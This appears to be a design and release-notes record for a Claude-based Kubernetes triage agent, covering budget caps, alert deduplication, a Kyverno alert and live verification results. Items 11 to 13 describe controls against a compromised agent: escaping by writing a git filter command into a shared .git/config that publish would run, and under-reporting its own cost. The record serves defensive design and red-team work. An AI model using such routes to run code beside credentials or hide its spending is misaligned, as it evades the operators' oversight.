9. `result.json` carries **`tool_denials`**, the evidence the injection red-team needs.
10. Live check 4 is verified by **the denied-tool-call record plus "no PR, no changed file"**, because Calico open source has no flow logs here.
11. **publish trusts only `result.json`.** It clones into its own volume and runs `python -I` with a minimal environment. The agent's `git log --output=` could otherwise write a `filter.<x>.clean` command into a shared `.git/config`, which publish would have run beside the App key.
12. **The agent cannot run git.** It reads previous values from `status.history`, events or ReplicaSets, and publish checks them against its own clone. This is the same finding as 11.
13. **The Anthropic workspace monthly limit is the spend security boundary**, not `daily_budget_usd`. `cost_usd` comes from a file the investigate container writes, so a compromised run can under-report it.

### Changes after first deploy (0.1.1 to 0.1.4)

- **0.1.1:** stopped sending `$schema` to `claude --json-schema`. 0.1.0 rejected the schema, so claude never ran. Each failed run was charged the full per-run cap as an unknown cost, which produced phantom $3.00 charges.
- **0.1.2:** run outcomes are kept on a Job annotation, so they survive pod deletion. Metric names may contain digits.
- **0.1.3:** **one incident per workload.** The canary's ~10 alerts produced 10 issues on 0.1.2 and 2 on 0.1.3. Runs that query capitalised metric names are kept.
  - Known gap, closed in 0.1.4: an alert arriving after its workload's Job has started is deduped, not appended to the issue, so an issue title names only the first alert.
- **0.1.4:**
  - **Late alerts are recorded.** A new alert name on a workload with an open issue is added to the title and noted in a comment, once.
  - **Deleting an app closes its issues.** When the owner cannot be confirmed on a resolve, the dispatcher also tries the controllers the pod's name fits, but only to match an issue that already exists. Removing the canary had left both of its issues open.
  - **One command per shell call** is now stated in both prompts. 11 of the first 51 runs lost turns to compound commands (`cd /work/repo; grep …`, `… | head`), which are denied unless every part is on the allow list.

### Calibrated caps

Measured over 39 runs that reported a cost: max $1.07 (a sweep), mean $0.47. Following the plan's rule (1.5x max, rounded up; daily 5x that):

- `per_run_budget_usd` = 2.
- `daily_budget_usd` = 10.
- Anthropic workspace monthly limit raised from $60 to $100.

A recheck on 2026-10-16 (18 runs in the 25h Job window) gave max $0.91, mean $0.51.

### Kyverno decision

`KyvernoPolicyNoPassResults` is live (#1371, `prometheusrule-kyverno.yaml`). It excludes four policies that measured zero passes for a known reason:

- `dmz-enforce-node-placement`
- `mutate-default-sa-automount`
- `patch-shlink-backend-probes`
- `restrict-default-namespace`

The sweep's `inert-kyverno-policy` check was dropped in favour of the alert.

### Live verification (2026-10-16)

All five checks passed, as recorded in `docs/runbooks/triage-agent.md`. Shadow grading at close-out: 10 `shadow-correct`, 4 `shadow-wrong`.

- **Wrong:**
  - Two early sweep findings flagged backup exclusions that were documented. The check was fixed in #1383.
  - Two `cpu-throttle-limit` proposals, for Loki and promtail, treated a log flood's symptom as a sizing problem.
- **Correct, and notable:** the agent independently diagnosed two real outages that it was not built for:
  - a zombie iSCSI session blocking a Longhorn attach;
  - ext4 corruption on a config volume.

